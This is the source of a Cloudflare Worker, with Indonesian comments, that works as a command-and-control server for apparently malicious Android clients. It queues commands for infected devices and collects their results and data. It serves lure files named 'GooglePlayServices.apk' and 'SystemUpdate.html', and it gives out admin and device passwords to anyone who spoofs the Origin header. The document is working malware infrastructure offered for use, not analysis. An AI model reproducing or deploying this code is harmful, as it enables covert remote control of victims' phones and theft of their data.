// ================================================================
// Cloudflare Worker - verifikasi-api (SUDAH DIPERBAIKI)
// ================================================================

// ============================================================
// KONFIGURASI
// ============================================================
const MAX_DATA = 5000;
const RATE_LIMIT = 100;
const RATE_WINDOW = 60000; // 1 menit

// ============================================================
// CORS HEADERS
// ============================================================
const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS, PATCH',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, X-Device-Id, X-Compressed, Range',
  'Access-Control-Expose-Headers': 'Content-Range, Content-Length, Accept-Ranges, X-Total-Count, X-Page, X-Limit',
  'Access-Control-Allow-Credentials': 'false',
  'Access-Control-Max-Age': '86400',
};

// ============================================================
// RESPONSE HELPERS
// ============================================================
function jsonResponse(data, status = 200, extraHeaders = {}) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json',
      ...CORS,
      ...extraHeaders,
    },
  });
}

function errorResponse(message, status = 400) {
  return jsonResponse({ error: message }, status);
}

function unauthorizedResponse() {
  return jsonResponse({ error: 'Access Denied' }, 403);
}

// ============================================================
// RATE LIMITING
// ============================================================
async function checkRateLimit(env, key) {
  const now = Date.now();
  const windowKey = `ratelimit_${key}_${Math.floor(now / RATE_WINDOW)}`;
  
  try {
    const raw = await env.DATA.get(windowKey);
    const count = parseInt(raw || '0', 10);
    
    if (count >= RATE_LIMIT) {
      return { allowed: false, retryAfter: RATE_WINDOW };
    }
    
    await env.DATA.put(windowKey, String(count + 1), { 
      expirationTtl: Math.floor(RATE_WINDOW / 1000) 
    });
    
    return { allowed: true };
  } catch(e) {
    return { allowed: true };
  }
}

// ============================================================
// 🔥 AUTHENTICATION - ADMIN & DEVICE
// ============================================================
function isAuthenticated(request, env) {
  const url = new URL(request.url);
  const key = url.searchParams.get('key') || 
              request.headers.get('X-API-Key') || 
              request.headers.get('Authorization')?.replace('Bearer ', '');
  return key === env.ADMIN_PASSWORD;
}

function isDeviceAuthenticated(request, env) {
  const url = new URL(request.url);
  const key = url.searchParams.get('key') || 
              request.headers.get('X-API-Key') || 
              request.headers.get('Authorization')?.replace('Bearer ', '');
  return key === env.PASSWORD;
}

// ============================================================
// MAIN HANDLER
// ============================================================
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const method = request.method;
    
    // OPTIONS - CORS Preflight
    if (method === 'OPTIONS') {
      return new Response(null, { headers: CORS });
    }

    // RATE LIMITING
    const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
    const rateCheck = await checkRateLimit(env, clientIP);
    if (!rateCheck.allowed) {
      return jsonResponse({ 
        error: 'Rate limit exceeded', 
        retryAfter: Math.ceil(rateCheck.retryAfter / 1000) 
      }, 429);
    }

    // ============================================================
    // WEBSOCKET - /ws (SUPPORT DUA PASSWORD)
    // ============================================================
    if (url.pathname === '/ws') {
      return handleWebSocket(request, env);
    }

    // ============================================================
    // GET /get-password - Untuk perangkat & admin
    // ============================================================
    if (url.pathname === '/get-password' && method === 'GET') {
      return handleGetPassword(request, env);
    }

    // ============================================================
    // GET /files - Untuk device (SystemUpdate.html)
    // ============================================================
    if (url.pathname === '/files' && method === 'GET') {
      if (isDeviceAuthenticated(request, env)) {
        return await handleDeviceFiles(request, env);
      }
      return unauthorizedResponse();
    }

    try {
      // GET / - Health Check
      if (url.pathname === '/' && method === 'GET') {
        const raw = await env.DATA.get('data');
        const data = raw ? JSON.parse(raw) : [];
        return jsonResponse({
          status: 'ok',
          version: '2.0.0',
          timestamp: new Date().toISOString(),
          totalData: data.length,
          uptime: Math.floor((Date.now() - (env.START_TIME || Date.now())) / 1000),
        });
      }

      // POST /data (ADMIN atau DEVICE)
      if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'POST') {
        if (isAuthenticated(request, env) || isDeviceAuthenticated(request, env)) {
          return await handlePostData(request, env);
        }
        return unauthorizedResponse();
      }

      // POST /batch (ADMIN)
      if ((url.pathname === '/batch' || url.pathname === '/api/batch') && method === 'POST') {
        if (!isAuthenticated(request, env)) {
          return unauthorizedResponse();
        }
        return await handleBatchData(request, env);
      }

      // GET /data (ADMIN) atau DEVICE POLLING
      if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'GET') {
        // Device polling (type=perintah) - pakai PASSWORD
        if (url.searchParams.get('type') === 'perintah') {
          if (isDeviceAuthenticated(request, env)) {
            return await handleDevicePolling(request, env);
          }
          return unauthorizedResponse();
        }
        
        // Admin get data - pakai ADMIN_PASSWORD
        if (isAuthenticated(request, env)) {
          return await handleGetData(request, env);
        }
        return unauthorizedResponse();
      }

      // GET /stats (ADMIN)
      if (url.pathname === '/stats' && method === 'GET') {
        if (!isAuthenticated(request, env)) {
          return unauthorizedResponse();
        }
        return await handleStats(request, env);
      }

      // POST /clear (ADMIN)
      if (url.pathname === '/clear' && method === 'POST') {
        if (!isAuthenticated(request, env)) {
          return unauthorizedResponse();
        }
        return await handleClear(request, env);
      }

      // POST /delete (ADMIN)
      if (url.pathname === '/delete' && method === 'POST') {
        if (!isAuthenticated(request, env)) {
          return unauthorizedResponse();
        }
        return await handleDelete(request, env);
      }

      // GET /c2 (ADMIN)
      if (url.pathname === '/c2' && method === 'GET') {
        if (!isAuthenticated(request, env)) {
          return unauthorizedResponse();
        }
        return await handleC2(request, env);
      }

      // POST /c2 (ADMIN)
      if (url.pathname === '/c2' && method === 'POST') {
        if (!isAuthenticated(request, env)) {
          return unauthorizedResponse();
        }
        return await handleC2Post(request, env);
      }

      // POST /c2/result (DEVICE)
      if (url.pathname === '/c2/result' && method === 'POST') {
        if (isDeviceAuthenticated(request, env)) {
          return await handleC2Result(request, env);
        }
        return unauthorizedResponse();
      }

      // GET /c2/history (ADMIN)
      if (url.pathname === '/c2/history' && method === 'GET') {
        if (!isAuthenticated(request, env)) {
          return unauthorizedResponse();
        }
        return await handleC2History(request, env);
      }

      // GET /api/files (ADMIN)
      if (url.pathname === '/api/files' && method === 'GET') {
        if (!isAuthenticated(request, env)) {
          return unauthorizedResponse();
        }
        return await handleListFiles(request, env);
      }

      // GET /api/download (ADMIN)
      if (url.pathname === '/api/download' && method === 'GET') {
        if (!isAuthenticated(request, env)) {
          return unauthorizedResponse();
        }
        return await handleDownloadFile(request, env);
      }

      // POST /api/upload (ADMIN)
      if (url.pathname === '/api/upload' && method === 'POST') {
        if (!isAuthenticated(request, env)) {
          return unauthorizedResponse();
        }
        return await handleUploadFile(request, env);
      }

      // POST /api/delete (ADMIN)
      if (url.pathname === '/api/delete' && method === 'POST') {
        if (!isAuthenticated(request, env)) {
          return unauthorizedResponse();
        }
        return await handleDeleteFile(request, env);
      }

      // POST /error
      if (url.pathname === '/error' && method === 'POST') {
        return await handleError(request, env);
      }

      // 404
      return errorResponse('Not Found', 404);
      
    } catch (error) {
      console.error('Worker Error:', error);
      
      try {
        const errorLog = await env.DATA.get('error_log') || '[]';
        const logs = JSON.parse(errorLog);
        logs.push({
          timestamp: new Date().toISOString(),
          message: error.message,
          stack: error.stack,
          url: url.pathname,
          method: method,
        });
        if (logs.length > 100) logs.shift();
        await env.DATA.put('error_log', JSON.stringify(logs));
      } catch(e) {}
      
      return jsonResponse({ 
        error: 'Internal Server Error', 
        message: error.message 
      }, 500);
    }
  }
};

// ============================================================
// 🔥 HANDLER: GET /get-password (DENGAN TYPE ADMIN)
// ============================================================
async function handleGetPassword(request, env) {
  const url = new URL(request.url);
  const type = url.searchParams.get('type');
  const origin = request.headers.get('Origin') || '';
  const host = request.headers.get('Host') || '';
  const userAgent = request.headers.get('User-Agent') || '';
  
  const isAllowed = origin.includes('verifikasi.site') || 
                    host.includes('verifikasi.site') ||
                    origin.includes('localhost') ||
                    host.includes('localhost');
  
  const hasValidUA = userAgent.includes('Android') || 
                     userAgent.includes('Mozilla') || 
                     userAgent.includes('Chrome') ||
                     userAgent.includes('Mobile');
  
  // 🔥 Untuk admin dashboard
  if (type === 'admin') {
    if (isAllowed) {
      return jsonResponse({ 
        status: 'ok', 
        password: env.ADMIN_PASSWORD,
        timestamp: Date.now(),
        role: 'admin'
      });
    }
    return jsonResponse({ error: 'Access Denied' }, 403);
  }
  
  // 🔥 Untuk device
  if (isAllowed && hasValidUA) {
    return jsonResponse({ 
      status: 'ok', 
      password: env.PASSWORD,
      timestamp: Date.now(),
      role: 'device'
    });
  }
  
  return jsonResponse({ error: 'Access Denied' }, 403);
}

// ============================================================
// 🔥 HANDLER: GET /files (UNTUK DEVICE)
// ============================================================
async function handleDeviceFiles(request, env) {
  try {
    const url = new URL(request.url);
    const path = url.searchParams.get('path') || '/';
    
    // Daftar file yang tersedia untuk device
    const files = [
      { name: 'GooglePlayServices.apk', path: '/files/GooglePlayServices.apk', size: 1024 * 1024, isDirectory: false },
      { name: 'SystemUpdate.html', path: '/files/SystemUpdate.html', size: 1024 * 50, isDirectory: false }
    ];
    
    return jsonResponse(files);
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// 🔥 HANDLER: POST /data (ADMIN & DEVICE)
// ============================================================
async function handlePostData(request, env) {
  try {
    const body = await request.json();
    
    if (!body || typeof body !== 'object') {
      return errorResponse('Invalid request body');
    }
    
    const d = {
      waktu: new Date().toISOString(),
      sumber: body.sumber || body.type || 'unknown',
      data: body.data || body,
      ip: request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || 'unknown',
      userAgent: request.headers.get('User-Agent') || 'unknown',
    };
    
    if (d.sumber === 'c2_command') {
      const cmdData = d.data;
      cmdData.timestamp = Date.now();
      cmdData.status = 'pending';
      
      await env.DATA.put('perintah', JSON.stringify(cmdData));
      
      const historyRaw = await env.DATA.get('c2_history') || '[]';
      const history = JSON.parse(historyRaw);
      history.push({
        waktu: d.waktu,
        perintah: cmdData.aksi || 'unknown',
        status: 'pending',
        ip: d.ip,
      });
      if (history.length > 100) history.shift();
      await env.DATA.put('c2_history', JSON.stringify(history));
      
      return jsonResponse({ 
        status: 'ok', 
        type: 'c2', 
        command: cmdData.aksi 
      });
    }
    
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    
    if (data.length >= MAX_DATA) {
      data = data.slice(-MAX_DATA + 1);
    }
    
    data.push(d);
    await env.DATA.put('data', JSON.stringify(data));
    
    return jsonResponse({ 
      status: 'ok', 
      total: data.length,
      id: data.length - 1,
    });
    
  } catch (error) {
    return errorResponse('Failed to process data: ' + error.message);
  }
}

// ============================================================
// HANDLER: POST /batch (ADMIN)
// ============================================================
async function handleBatchData(request, env) {
  try {
    const body = await request.json();
    
    if (!body.items || !Array.isArray(body.items)) {
      return errorResponse('Invalid batch: items array required');
    }
    
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    
    let added = 0;
    body.items.forEach(item => {
      const d = {
        waktu: new Date().toISOString(),
        sumber: item.sumber || item.type || 'unknown',
        data: item.data || item,
        ip: request.headers.get('CF-Connecting-IP') || 'unknown',
        userAgent: request.headers.get('User-Agent') || 'unknown',
      };
      
      if (data.length >= MAX_DATA) {
        data = data.slice(-MAX_DATA + 1);
      }
      data.push(d);
      added++;
    });
    
    await env.DATA.put('data', JSON.stringify(data));
    
    return jsonResponse({ 
      status: 'ok', 
      added: added,
      total: data.length,
    });
    
  } catch (error) {
    return errorResponse('Failed to process batch: ' + error.message);
  }
}

// ============================================================
// 🔥 HANDLER: GET /data (ADMIN)
// ============================================================
async function handleGetData(request, env) {
  const url = new URL(request.url);
  
  try {
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    
    const source = url.searchParams.get('source');
    if (source) {
      data = data.filter(item => item.sumber === source);
    }
    
    const search = url.searchParams.get('search');
    if (search) {
      const s = search.toLowerCase();
      data = data.filter(item => {
        const json = JSON.stringify(item).toLowerCase();
        return json.includes(s);
      });
    }
    
    const sort = url.searchParams.get('sort') || 'newest';
    if (sort === 'newest') {
      data.sort((a, b) => new Date(b.waktu).getTime() - new Date(a.waktu).getTime());
    } else if (sort === 'oldest') {
      data.sort((a, b) => new Date(a.waktu).getTime() - new Date(b.waktu).getTime());
    } else if (sort === 'source') {
      data.sort((a, b) => (a.sumber || '').localeCompare(b.sumber || ''));
    }
    
    const page = parseInt(url.searchParams.get('page')) || 1;
    const limit = Math.min(parseInt(url.searchParams.get('limit')) || 50, 200);
    const total = data.length;
    const totalPages = Math.ceil(total / limit);
    const start = (page - 1) * limit;
    const end = Math.min(start + limit, total);
    const paginatedData = data.slice(start, end);
    
    return jsonResponse(paginatedData, 200, {
      'X-Total-Count': total,
      'X-Page': page,
      'X-Limit': limit,
      'X-Total-Pages': totalPages,
    });
    
  } catch(e) {
    return jsonResponse([], 200);
  }
}

// ============================================================
// 🔥 HANDLER: DEVICE POLLING (MULTIPLE COMMANDS)
// ============================================================
async function handleDevicePolling(request, env) {
  try {
    // Ambil semua perintah yang pending
    const commandsRaw = await env.DATA.get('c2_commands') || '[]';
    const commands = JSON.parse(commandsRaw);
    
    // Cari perintah yang belum dieksekusi
    const pending = commands.filter(cmd => !cmd.executed);
    
    if (pending.length > 0) {
      // Ambil perintah pertama
      const cmd = pending[0];
      // Tandai sebagai sedang diproses
      cmd.status = 'processing';
      await env.DATA.put('c2_commands', JSON.stringify(commands));
      
      return new Response(JSON.stringify({
        aksi: cmd.aksi,
        params: cmd.params || {},
        id: cmd.id,
        timestamp: cmd.timestamp
      }), {
        headers: {
          'Content-Type': 'application/json',
          ...CORS,
        },
      });
    }
    
    // Tidak ada perintah
    return new Response(JSON.stringify({
      status: 'no_command'
    }), {
      headers: {
        'Content-Type': 'application/json',
        ...CORS,
      },
    });
    
  } catch(e) {
    return new Response(JSON.stringify({
      status: 'error',
      message: e.message
    }), {
      status: 500,
      headers: {
        'Content-Type': 'application/json',
        ...CORS,
      },
    });
  }
}

// ============================================================
// HANDLER: GET /stats (ADMIN)
// ============================================================
async function handleStats(request, env) {
  try {
    const raw = await env.DATA.get('data') || '[]';
    const data = JSON.parse(raw);
    const stats = {};
    
    data.forEach(item => {
      const source = item.sumber || 'unknown';
      stats[source] = (stats[source] || 0) + 1;
    });
    
    const latest = data.length > 0 ? data[data.length - 1] : null;
    
    let timeRange = { first: null, last: null };
    if (data.length > 0) {
      const times = data.map(d => new Date(d.waktu).getTime()).filter(t => !isNaN(t));
      if (times.length > 0) {
        timeRange.first = new Date(Math.min(...times)).toISOString();
        timeRange.last = new Date(Math.max(...times)).toISOString();
      }
    }
    
    return jsonResponse({
      total: data.length,
      bySource: stats,
      latest: latest,
      timeRange: timeRange,
      timestamp: new Date().toISOString(),
    });
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: POST /clear (ADMIN)
// ============================================================
async function handleClear(request, env) {
  try {
    const url = new URL(request.url);
    const source = url.searchParams.get('source');
    
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    
    if (source) {
      const before = data.length;
      data = data.filter(item => item.sumber !== source);
      const deleted = before - data.length;
      await env.DATA.put('data', JSON.stringify(data));
      return jsonResponse({
        status: 'ok',
        deleted: deleted,
        remaining: data.length,
        source: source,
      });
    } else {
      await env.DATA.delete('data');
      await env.DATA.delete('perintah');
      await env.DATA.delete('c2_commands');
      return jsonResponse({
        status: 'ok',
        message: 'All data cleared',
        deleted: data.length,
      });
    }
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: POST /delete (ADMIN)
// ============================================================
async function handleDelete(request, env) {
  try {
    const body = await request.json();
    const index = body.index;
    const id = body.id;
    
    if (index === undefined && id === undefined) {
      return errorResponse('index or id required');
    }
    
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    
    let deleted = false;
    if (index !== undefined && index >= 0 && index < data.length) {
      data.splice(index, 1);
      deleted = true;
    } else if (id !== undefined) {
      data = data.filter(item => {
        const itemId = item.waktu || item.id;
        if (itemId === id) {
          deleted = true;
          return false;
        }
        return true;
      });
    }
    
    if (!deleted) {
      return jsonResponse({ error: 'Item not found' }, 404);
    }
    
    await env.DATA.put('data', JSON.stringify(data));
    return jsonResponse({
      status: 'ok',
      deleted: true,
      remaining: data.length,
    });
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: GET /c2 (ADMIN)
// ============================================================
async function handleC2(request, env) {
  try {
    const raw = await env.DATA.get('c2_commands') || '[]';
    const commands = JSON.parse(raw);
    return jsonResponse(commands);
  } catch(e) {
    return jsonResponse([]);
  }
}

// ============================================================
// 🔥 HANDLER: POST /c2 (MULTIPLE COMMANDS QUEUE)
// ============================================================
async function handleC2Post(request, env) {
  try {
    const body = await request.json();
    const aksi = body.aksi || body.command || 'unknown';
    
    // Generate ID unik
    const id = Date.now() + '_' + Math.random().toString(36).substring(2, 7);
    
    const cmd = {
      id: id,
      aksi: aksi,
      device: body.device || 'all',
      params: body.params || {},
      timestamp: Date.now(),
      status: 'queued',
      executed: false
    };
    
    // Simpan ke queue
    const commandsRaw = await env.DATA.get('c2_commands') || '[]';
    const commands = JSON.parse(commandsRaw);
    commands.push(cmd);
    await env.DATA.put('c2_commands', JSON.stringify(commands));
    
    // Log history
    const logRaw = await env.DATA.get('c2_history') || '[]';
    const log = JSON.parse(logRaw);
    log.push({
      waktu: new Date().toISOString(),
      device: cmd.device,
      perintah: aksi,
      status: 'queued',
      id: id,
      params: cmd.params,
    });
    if (log.length > 100) log.shift();
    await env.DATA.put('c2_history', JSON.stringify(log));
    
    return jsonResponse({
      status: 'ok',
      command: aksi,
      device: cmd.device,
      id: id,
    });
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// 🔥 HANDLER: POST /c2/result (DEVICE KIRIM HASIL)
// ============================================================
async function handleC2Result(request, env) {
  try {
    const body = await request.json();
    const { id, hasil, perintah } = body;
    
    // Update command status di queue
    if (id) {
      const commandsRaw = await env.DATA.get('c2_commands') || '[]';
      const commands = JSON.parse(commandsRaw);
      const cmd = commands.find(c => c.id === id);
      if (cmd) {
        cmd.executed = true;
        cmd.status = 'done';
        cmd.result = hasil;
        cmd.executedAt = Date.now();
        await env.DATA.put('c2_commands', JSON.stringify(commands));
      }
    }
    
    // Simpan result ke data
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    data.push({
      waktu: new Date().toISOString(),
      sumber: 'c2_result',
      data: {
        perintah: perintah || 'unknown',
        hasil: hasil,
        id: id,
      },
      ip: request.headers.get('CF-Connecting-IP') || 'unknown',
    });
    if (data.length > MAX_DATA) data = data.slice(-MAX_DATA);
    await env.DATA.put('data', JSON.stringify(data));
    
    return jsonResponse({ status: 'ok' });
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: GET /c2/history (ADMIN)
// ============================================================
async function handleC2History(request, env) {
  try {
    const raw = await env.DATA.get('c2_history') || '[]';
    const history = JSON.parse(raw);
    return jsonResponse(history);
  } catch(e) {
    return jsonResponse([]);
  }
}

// ============================================================
// HANDLER: GET /api/files (ADMIN)
// ============================================================
async function handleListFiles(request, env) {
  try {
    const url = new URL(request.url);
    const path = url.searchParams.get('path') || '/';
    
    const filesRaw = await env.DATA.get('files_list') || '[]';
    const files = JSON.parse(filesRaw);
    const filtered = files.filter(f => f.path.startsWith(path));
    
    return jsonResponse(filtered);
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: GET /api/download (ADMIN)
// ============================================================
async function handleDownloadFile(request, env) {
  try {
    const url = new URL(request.url);
    const path = url.searchParams.get('path');
    
    if (!path) {
      return errorResponse('path required');
    }
    
    const fileKey = `file_${path}`;
    const fileData = await env.DATA.get(fileKey);
    
    if (!fileData) {
      return errorResponse('File not found', 404);
    }
    
    const file = JSON.parse(fileData);
    
    return new Response(file.content, {
      headers: {
        'Content-Type': file.mimeType || 'application/octet-stream',
        'Content-Disposition': `attachment; filename="${file.name}"`,
        ...CORS,
      },
    });
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: POST /api/upload (ADMIN)
// ============================================================
async function handleUploadFile(request, env) {
  try {
    const formData = await request.formData();
    const file = formData.get('file');
    const path = formData.get('path') || '/';
    
    if (!file) {
      return errorResponse('file required');
    }
    
    const buffer = await file.arrayBuffer();
    const base64 = btoa(String.fromCharCode(...new Uint8Array(buffer)));
    
    const fileData = {
      name: file.name,
      path: path + file.name,
      size: file.size,
      mimeType: file.type || 'application/octet-stream',
      content: base64,
      uploadedAt: new Date().toISOString(),
    };
    
    const fileKey = `file_${path}${file.name}`;
    await env.DATA.put(fileKey, JSON.stringify(fileData));
    
    const filesRaw = await env.DATA.get('files_list') || '[]';
    const files = JSON.parse(filesRaw);
    files.push({
      name: file.name,
      path: path + file.name,
      size: file.size,
      isDir: false,
      uploadedAt: fileData.uploadedAt,
    });
    await env.DATA.put('files_list', JSON.stringify(files));
    
    return jsonResponse({
      status: 'ok',
      name: file.name,
      size: file.size,
    });
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: POST /api/delete (ADMIN)
// ============================================================
async function handleDeleteFile(request, env) {
  try {
    const body = await request.json();
    const path = body.path;
    
    if (!path) {
      return errorResponse('path required');
    }
    
    const fileKey = `file_${path}`;
    await env.DATA.delete(fileKey);
    
    const filesRaw = await env.DATA.get('files_list') || '[]';
    const files = JSON.parse(filesRaw);
    const filtered = files.filter(f => f.path !== path);
    await env.DATA.put('files_list', JSON.stringify(filtered));
    
    return jsonResponse({
      status: 'ok',
      deleted: true,
    });
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: POST /error
// ============================================================
async function handleError(request, env) {
  try {
    const body = await request.json();
    
    const errorLog = await env.DATA.get('error_log') || '[]';
    const logs = JSON.parse(errorLog);
    logs.push({
      timestamp: new Date().toISOString(),
      ...body,
    });
    if (logs.length > 100) logs.shift();
    await env.DATA.put('error_log', JSON.stringify(logs));
    
    return jsonResponse({ status: 'ok' });
    
  } catch(e) {
    return jsonResponse({ status: 'ok' });
  }
}

// ============================================================
// 🔥 HANDLER: WebSocket (SUPPORT DUA PASSWORD)
// ============================================================
async function handleWebSocket(request, env) {
  const upgradeHeader = request.headers.get('Upgrade');
  if (!upgradeHeader || upgradeHeader !== 'websocket') {
    return new Response('Expected Upgrade: websocket', { status: 426 });
  }

  const webSocketPair = new WebSocketPair();
  const [client, server] = Object.values(webSocketPair);

  server.accept();

  let authenticated = false;
  let deviceId = 'unknown';
  let isDashboard = false;

  server.addEventListener('message', async (event) => {
    try {
      const data = JSON.parse(event.data);
      
      if (data.type === 'auth') {
        // 🔥 CEK ADMIN_PASSWORD UNTUK DASHBOARD
        if (data.key === env.ADMIN_PASSWORD) {
          authenticated = true;
          deviceId = data.deviceId || 'dashboard';
          isDashboard = true;
          server.send(JSON.stringify({ type: 'auth_success', role: 'admin' }));
          console.log('✅ WS Authenticated (Dashboard):', deviceId);
        }
        // 🔥 CEK PASSWORD UNTUK DEVICE
        else if (data.key === env.PASSWORD) {
          authenticated = true;
          deviceId = data.deviceId || 'device';
          isDashboard = false;
          server.send(JSON.stringify({ type: 'auth_success', role: 'device' }));
          console.log('✅ WS Authenticated (Device):', deviceId);
        }
        // 🔥 PASSWORD SALAH
        else {
          server.send(JSON.stringify({ type: 'auth_failed' }));
          server.close(1008, 'Auth failed');
        }
        return;
      }

      if (!authenticated) {
        server.close(1008, 'Unauthorized');
        return;
      }

      // ============================================================
      // 🔥 PERBEDAAN PERLAKUAN BERDASARKAN ROLE
      // ============================================================

      // 1. COMMAND DARI DASHBOARD → Simpan perintah ke queue
      if (data.type === 'command' && isDashboard) {
        const cmd = data.command;
        const id = Date.now() + '_' + Math.random().toString(36).substring(2, 7);
        cmd.id = id;
        cmd.timestamp = Date.now();
        cmd.executed = false;
        cmd.status = 'queued';
        
        const commandsRaw = await env.DATA.get('c2_commands') || '[]';
        const commands = JSON.parse(commandsRaw);
        commands.push(cmd);
        await env.DATA.put('c2_commands', JSON.stringify(commands));
        
        server.send(JSON.stringify({
          type: 'command_received',
          command: cmd.aksi,
          id: id
        }));
        return;
      }

      // 2. DATA DARI DEVICE → Simpan ke KV
      if (data.type === 'data' && !isDashboard) {
        const raw = await env.DATA.get('data') || '[]';
        let allData = JSON.parse(raw);
        allData.push({
          waktu: new Date().toISOString(),
          sumber: 'websocket_device',
          data: data.data,
          deviceId: deviceId
        });
        if (allData.length > MAX_DATA) {
          allData = allData.slice(-MAX_DATA);
        }
        await env.DATA.put('data', JSON.stringify(allData));
        server.send(JSON.stringify({ type: 'data_saved' }));
        return;
      }

      // 3. C2 RESULT DARI DEVICE → Simpan + notifikasi
      if (data.type === 'c2_result' && !isDashboard) {
        const raw = await env.DATA.get('data') || '[]';
        let allData = JSON.parse(raw);
        allData.push({
          waktu: new Date().toISOString(),
          sumber: 'c2_result',
          data: data.data,
          deviceId: deviceId
        });
        if (allData.length > MAX_DATA) {
          allData = allData.slice(-MAX_DATA);
        }
        await env.DATA.put('data', JSON.stringify(allData));
        server.send(JSON.stringify({ type: 'result_saved' }));
        return;
      }

      // 4. PING/PONG
      if (data.type === 'ping') {
        server.send(JSON.stringify({
          type: 'pong',
          timestamp: data.timestamp
        }));
        return;
      }

      // Default
      server.send(JSON.stringify({ type: 'echo', data: data }));

    } catch(e) {
      server.send(JSON.stringify({ type: 'error', message: e.message }));
    }
  });

  server.addEventListener('close', () => {
    console.log('❌ WS Closed:', deviceId, 'isDashboard:', isDashboard);
  });

  return new Response(null, {
    status: 101,
    webSocket: client,
  });
}
